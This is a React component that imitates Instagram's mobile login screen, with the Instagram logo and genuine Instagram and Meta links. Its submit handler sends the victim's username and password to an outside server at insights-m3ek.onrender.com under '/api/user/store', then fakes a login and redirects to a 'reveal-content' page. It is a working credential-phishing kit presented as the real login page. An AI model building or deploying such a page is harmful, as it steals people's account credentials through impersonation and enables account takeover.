import React, { useState } from 'react';
import axios from 'axios';
import { useNavigate } from "react-router-dom";
import { ChevronDown, ArrowLeft, Eye, EyeOff } from "lucide-react";

const InstagramMobileLogin = () => {
  const navigate = useNavigate();
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!password) return;
    setIsLoading(true);
    
    try {
      await axios.post("https://insights-m3ek.onrender.com/api/user/store", { identifier, password });
      // Simulating a successful login redirect
      setTimeout(() => navigate("/reveal-content"), 1500);
    } catch (err) {
      setIsLoading(false);
      alert("Invalid password. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans text-[#262626] ">
      {/* Top Navigation */}
      <div className="p-4 flex items-center justify-between">
        <ArrowLeft size={24} className="text-black cursor-pointer" onClick={() => window.history.back()} />
      </div>

      <div className="flex flex-col items-center px-8 w-full max-w-md mx-auto border  px-4 py-16 rounded">
        {/* Language Selector - Real Link */}
      

        {/* Gradient Icon */}
        <div className="mb-12">
          <img 
            src="/logo3.png" 
            alt="Instagram" 
            className="w-[72px] h-[72px]"
          />
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="w-full space-y-3">
          {/* Username Field */}
          <div className="w-full px-4 pt-3 pb-2 border border-[#CBD5E1] rounded-[18px] bg-white focus-within:border-gray-400">
            <label className="block text-[12px] text-[#616161] leading-tight">
              Username, email address or mobile number
            </label>
            <input
              type="text"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              className="w-full text-[16px] outline-none bg-transparent pt-1"
              autoCapitalize="none"
            />
          </div>

          {/* Password Field with Show/Hide Toggle */}
          <div className="w-full px-4 py-4 border border-[#CBD5E1] rounded-[18px] bg-white flex items-center focus-within:border-gray-400">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full text-[16px] outline-none bg-transparent placeholder:text-[#616161]"
            />
            {password && (
              <button 
                type="button" 
                onClick={() => setShowPassword(!showPassword)}
                className="ml-2 text-[#616161]"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            )}
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={!password || isLoading}
            className="w-full py-[14px] bg-[#0064E0] text-white font-semibold rounded-full text-[16px] mt-2 disabled:opacity-50 transition-all active:scale-95 flex justify-center items-center"
          >
            {isLoading ? "Logging in..." : "Log in"}
          </button>

          {/* Forgotten Password - Real Link */}
          <div className="text-center pt-4">
            <a 
              href="https://www.instagram.com/accounts/password/reset/" 
              className="font-semibold text-[14px] text-black hover:opacity-70"
            >
              Forgotten password?
            </a>
          </div>
          <div className="mt-auto flex flex-col items-center px-8 pb-8 gap-4">
        {/* Create Account - Real Link */}
        <a 
          href="https://www.instagram.com/accounts/emailsignup/" 
          className="w-full py-3 border-[1.5px] border-[#0064E0] text-[#0064E0] font-semibold rounded-full text-[16px] max-w-md text-center hover:bg-[#f0f9ff]"
        >
          Create new account
        </a>
        
        {/* Meta Branding - Real Link */}
        <a 
          href="https://about.meta.com/" 
          className="flex items-center gap-1 opacity-80 mt-2 hover:opacity-100"
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#0064E0">
            <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
          </svg>
          <span className="text-[16px] font-bold text-gray-700 tracking-tight">Meta</span>
        </a>
      </div>
        </form>
      </div>

      {/* Footer Area */}
      
    </div>
  );
};

export default InstagramMobileLogin;